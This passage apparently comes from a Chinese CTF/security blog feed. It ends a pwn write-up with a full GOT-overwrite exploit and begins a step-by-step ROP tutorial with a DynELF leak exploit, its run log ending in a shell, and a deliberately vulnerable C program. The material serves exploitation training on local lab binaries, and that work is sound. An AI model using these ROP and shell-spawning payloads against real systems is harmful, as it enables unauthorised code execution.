...)</span><br></pre></td></tr></table></figure><p>可以看到，此程序是将输入的<code>name</code>和<code>occupation</code>复制到字符数组<code>s</code>中，但是返回值<code>nbytes</code>得到的是实际输入的两个字符串长度和格式化字符串之和。后面又用到了<code>read()</code>函数，显然在这里存在<code>栈溢出</code>，可以控制程序运行流程。还可以看到<code>s</code>数组的起始地址是<code>bp-111h</code>,所以输入<code>(bp-111h)+4</code>个字节数据就可以覆盖到返回地址。这里我们用<code>puts()</code>函数泄露出<code>puts()</code>的真实地址，通过计算偏移，算出<code>system</code>的地址。<code>/bin/sh</code>的地址可以用<code>read()</code>读入<code>bss段</code>，也可以直接利用<code>libc</code>中的。我这里使用的是将<code>system</code>地址覆盖到<code>printf</code>的<code>Got表</code>，并用<code>read()</code>将<code>/bin/sh</code>读入<code>bss段</code>。显然有些麻烦，直接转到算出的system地址和/bin/sh地址比较方便，代码也少。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#GOT table cover</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./game_server'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6_2.23-0ubuntu10_i386.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./game_server'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt = "</span> + hex(puts_plt)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got = "</span> + hex(puts_got)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_plt = "</span> + hex(read_plt)</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got = "</span> + hex(printf_got)</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_plt = "</span> + hex(printf_plt)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bss_base = "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line">p_ebp_ret = <span class="number">0x0804881b</span><span class="comment"># : pop ebp ; ret</span></span><br><span class="line">ppp_ret = <span class="number">0x08048819</span><span class="comment"># : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_offset = "</span> + hex(puts_offset)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_offset = "</span> + hex(system_offset)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'First, you need to tell me you name?\n'</span>)</span><br><span class="line">Io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'What\'s you occupation?\n'</span>)</span><br><span class="line">Io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'Y'</span></span><br><span class="line">Io.recvuntil(<span class="string">'Do you want to edit you introduce by yourself?[Y/N]\n'</span>)</span><br><span class="line">Io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'a'</span>*<span class="number">0x111</span> + <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload4 += p32(puts_plt) + p32(p_ebp_ret) + p32(puts_got)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(printf_got) + p32(<span class="number">4</span>)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line">payload4 += p32(printf_plt) + p32(ret) + p32(bss_base)</span><br><span class="line"></span><br><span class="line">Io.sendline(payload4)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(Io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr = "</span> + hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span> + hex(libc_base)</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">Io.send(p32(system_addr))</span><br><span class="line">Io.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Stack Overflow </tag>
            
            <tag> Got表覆写 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一步一步学ROP之Linux_x64篇-蒸米</title>
      <link href="/2018/05/11/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x64%E7%AF%87-%E8%92%B8%E7%B1%B3/"/>
      <url>/2018/05/11/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x64%E7%AF%87-%E8%92%B8%E7%B1%B3/</url>
      <content type="html"><![CDATA[<blockquote><p>这篇博客记录我跟着蒸米大神的文章一步一步学ROP之Linux_x64学习ROP的过程。在进行复现的时候，遇到了一些问题，文章中会提到。<br><a id="more"></a></p></blockquote><h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p><code>ROP</code>的全称为Return-oriented programming（返回导向编程），这是一种<code>高级的内存攻击技术</code>可以用来<code>绕过</code>现代操作系统的各种通用<code>防御</code>（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x86的ROP攻击。</p><p>一步一步学ROP之linux_x86篇 <a href="http://drops.wooyun.org/tips/6597" target="_blank" rel="noopener">http://drops.wooyun.org/tips/6597</a></p><p>在这次的教程中我们会带来上一篇的补充以及<code>linux_x64</code>方面的ROP利用方法，欢迎大家继续学习。</p><p>另外文中涉及代码可在我的github下载：</p><div class="github-widget" data-repo="zhengmin1989/ROP_STEP_BY_STEP"></div><h3 id="0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击"><a href="#0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击"></a>0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</h3><p>注意，这一节是上一篇文章的补充，还是讲的<code>x86</code>的ROP。上次讲到了如何通过ROP绕过x86下<code>DEP</code>和<code>ASLR</code>防护。但是我们要事先得到目标机器上的<code>libc.so</code>或者具体的<code>linux版本号</code>才能计算出相应的<code>offset</code>。那么如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过<code>memory leak(内存泄露)</code>来搜索内存找到<code>system()</code>的地址。</p><p>这里我们采用<code>pwntools</code>提供的<code>DynELF</code>模块来进行内存搜索。首先我们需要实现一个<code>leak(address)</code>函数，通过这个函数可以获取到某个地址上<code>最少1 byte的数据</code>。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>随后将这个函数作为参数再调用<code>d = DynELF(leak, elf=ELF(&#39;./level2&#39;))</code>就可以对DynELF模块进行<code>初始化</code>了。然后可以通过调用<code>system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)</code>来得到libc.so中<code>system()在内存中的地址</code>。</p><p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串<code>“/bin/sh”</code>在内存中的地址。所以我们在payload中需要调用<code>read()</code>将“/bin/sh”这字符串写入到程序的<code>.bss段</code>中。.bss段是用来保存全局变量的值的，<code>地址固定</code>，并且<code>可以读可写</code>。通过<code>readelf -S level2</code>这个命令就可以获取到bss段的地址了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S level2</span><br><span class="line">There are 30 section headers, starting at offset 0x1148:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">……</span><br><span class="line">  [23] .got.plt          PROGBITS        08049ff4 000ff4 000024 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001020 00002a 01  MS  0   0  1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>因为我们在执行完<code>read()</code>之后要接着调用<code>system(“/bin/sh”)</code>，并且read()这个函数的<code>参数有三个</code>，所以我们需要一个<code>pop pop pop ret</code>的<code>gadget</code>用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。PS：我们会在随后的章节中介绍如何用工具寻找更复杂的gadgets。</p><p>整个攻击过程如下：首先通过DynELF获取到<code>system()</code>的地址后，我们又通过read将<code>“/bin/sh”</code>写入到.bss段上，最后再调用<code>system（.bss）</code>，执行“/bin/sh”。最终的exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048471</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'A'</span>*<span class="number">140</span></span><br><span class="line">    payload1 += p32(write_plt)</span><br><span class="line">    payload1 += p32(vulfun_addr)</span><br><span class="line">    payload1 += p32(<span class="number">1</span>)</span><br><span class="line">    payload1 += p32(address)</span><br><span class="line">    payload1 += p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10002)</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level2'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">pppr_addr = <span class="number">0x080484f9</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">140</span></span><br><span class="line">payload2 += p32(read_plt)</span><br><span class="line">payload2 += p32(pppr_addr)</span><br><span class="line">payload2 += p32(<span class="number">0</span>)</span><br><span class="line">payload2 += p32(bss_addr)</span><br><span class="line">payload2 += p32(<span class="number">8</span>)</span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(vulfun_addr)</span><br><span class="line">payload2 += p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">$ python level4_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x04/level2'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./level2'</span>: pid <span class="number">10140</span></span><br><span class="line">0x8048000 =&gt; 7f454c46</span><br><span class="line">[+] Loading <span class="keyword">from</span> <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x04/level2'</span>: <span class="number">0xf7ffd918</span></span><br><span class="line">0x804a004 =&gt; 18d9fff7</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: <span class="number">0xf7ffd918</span></span><br><span class="line">0x8049f14 =&gt; 01000000</span><br><span class="line">0x8049f1c =&gt; 0c000000</span><br><span class="line">0x8049f24 =&gt; 0d000000</span><br><span class="line">0x8049f2c =&gt; 19000000</span><br><span class="line">0x8049f34 =&gt; 1b000000</span><br><span class="line">0x8049f3c =&gt; 1a000000</span><br><span class="line">0x8049f44 =&gt; 1c000000</span><br><span class="line">0x8049f4c =&gt; f5feff6f</span><br><span class="line">0x8049f54 =&gt; 05000000</span><br><span class="line">0x8049f5c =&gt; 06000000</span><br><span class="line">0x8049f64 =&gt; 0a000000</span><br><span class="line">0x8049f6c =&gt; 0b000000</span><br><span class="line">0x8049f74 =&gt; 15000000</span><br><span class="line">0x8049f7c =&gt; 03000000</span><br><span class="line">0x8049f80 =&gt; 00a00408</span><br><span class="line">0xf7ffd928 =&gt; 00000000</span><br><span class="line">0xf7ffd91c =&gt; 04dcfff7</span><br><span class="line">0xf7ffdc04 =&gt; 00000000</span><br><span class="line">0xf7ffd924 =&gt; 08dcfff7</span><br><span class="line">0xf7ffdc0c =&gt; 74defff7</span><br><span class="line">0xf7ffde74 =&gt; 00000000</span><br><span class="line">0xf7ffdc14 =&gt; b031fdf7</span><br><span class="line">0xf7fd31b4 =&gt; 9031fdf7</span><br><span class="line">0xf7fd3190 =&gt; 2f6c6962</span><br><span class="line">0xf7fd3194 =&gt; 2f693338</span><br><span class="line">0xf7fd3198 =&gt; 362d6c69</span><br><span class="line">0xf7fd319c =&gt; 6e75782d</span><br><span class="line">0xf7fd31a0 =&gt; 676e752f</span><br><span class="line">0xf7fd31a4 =&gt; 6c696263</span><br><span class="line">0xf7fd31a8 =&gt; 2e736f2e</span><br><span class="line">0xf7fd31ac =&gt; 36000000</span><br><span class="line">0xf7fd31b0 =&gt; 0020e0f7</span><br><span class="line">[!] No ELF provided.  Leaking <span class="keyword">is</span> much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">0xf7e02000 =&gt; 7f454c46</span><br><span class="line">0xf7fd31b8 =&gt; b03dfbf7</span><br><span class="line">0xf7e02004 =&gt; 01010103</span><br><span class="line">0xf7fb3db0 =&gt; 01000000</span><br><span class="line">0xf7fb3db8 =&gt; 0e000000</span><br><span class="line">0xf7fb3dc0 =&gt; 0c000000</span><br><span class="line">0xf7fb3dc8 =&gt; 19000000</span><br><span class="line">0xf7fb3dd0 =&gt; 1b000000</span><br><span class="line">0xf7fb3dd8 =&gt; 04000000</span><br><span class="line">0xf7fb3de0 =&gt; f5feff6f</span><br><span class="line">0xf7fb3de8 =&gt; 05000000</span><br><span class="line">0xf7fb3df0 =&gt; 06000000</span><br><span class="line">0xf7fb3df8 =&gt; 0a000000</span><br><span class="line">0xf7fb3e00 =&gt; 0b000000</span><br><span class="line">0xf7fb3e08 =&gt; 03000000</span><br><span class="line">0xf7fb3e0c =&gt; 0040fbf7</span><br><span class="line">0xf7e02010 =&gt; 03000300</span><br><span class="line">0xf7fb4004 =&gt; b031fdf7</span><br><span class="line">0xf7fd31c0 =&gt; 08dcfff7</span><br><span class="line">0xf7ffdc18 =&gt; 18d9fff7</span><br><span class="line">0xf7e02180 =&gt; 474e5500</span><br><span class="line">0xf7e02184 =&gt; dd5192a7</span><br><span class="line">0xf7e02188 =&gt; 69e33ed6</span><br><span class="line">0xf7e0218c =&gt; ca68a6ab</span><br><span class="line">0xf7e02190 =&gt; 5740ff9e</span><br><span class="line">0xf7e02194 =&gt; 8ec678a7</span><br><span class="line">[*] Trying lookup based on Build ID: dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] Skipping unavialable libc dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] .gnu.hash/.hash, .strtab <span class="keyword">and</span> .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at <span class="number">0xf7fb3de0</span></span><br><span class="line">0xf7fb3de4 =&gt; b821e0f7</span><br><span class="line">[*] Found DT_STRTAB at <span class="number">0xf7fb3de8</span></span><br><span class="line">0xf7fb3dec =&gt; 18f6e0f7</span><br><span class="line">[*] Found DT_SYMTAB at <span class="number">0xf7fb3df0</span></span><br><span class="line">0xf7fb3df4 =&gt; 285fe0f7</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">0xf7e021b8 =&gt; f3030000</span><br><span class="line">0xf7e021bc =&gt; 0a000000</span><br><span class="line">0xf7e021c0 =&gt; 00020000</span><br><span class="line">[*] hash chain index</span><br><span class="line">0xf7e03390 =&gt; b1050000</span><br><span class="line">[*] hash chain</span><br><span class="line">0xf7e05030 =&gt; 8ae4ee1c</span><br><span class="line">0xf7e0ba38 =&gt; 48310000</span><br><span class="line">0xf7e12760 =&gt; 73797374</span><br><span class="line">0xf7e12764 =&gt; 656d0074</span><br><span class="line">0xf7e0ba3c =&gt; a0ad0300</span><br><span class="line">system_addr= <span class="number">0xf7e3cda0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload2 ...###</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x02-linux-64与linux-86的区别"><a href="#0x02-linux-64与linux-86的区别" class="headerlink" title="0x02 linux_64与linux_86的区别"></a>0x02 linux_64与linux_86的区别</h3><p>linux_64与linux_86的区别主要有两点：首先是<code>内存地址</code>的范围由<code>32位变成了64位</code>。但是可以使用的内存地址<code>不能大于0x00007fffffffffff</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的<code>前六个参数</code>依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p><p>我们还是拿实际程序做例子进行讲解,level3.c内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们<code>打开ASLR</code>并用如下方法编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure><p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到<code>callsystem()</code>这个函数的地址上即可。因为<code>程序本身</code>在内存中的<code>地址不是随机的</code>，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> pattern.py create 150 &gt; payload</span><br><span class="line">$ cat payload </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>然后运行<code>gdb ./level3</code>后输入这串字符串造成程序崩溃。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 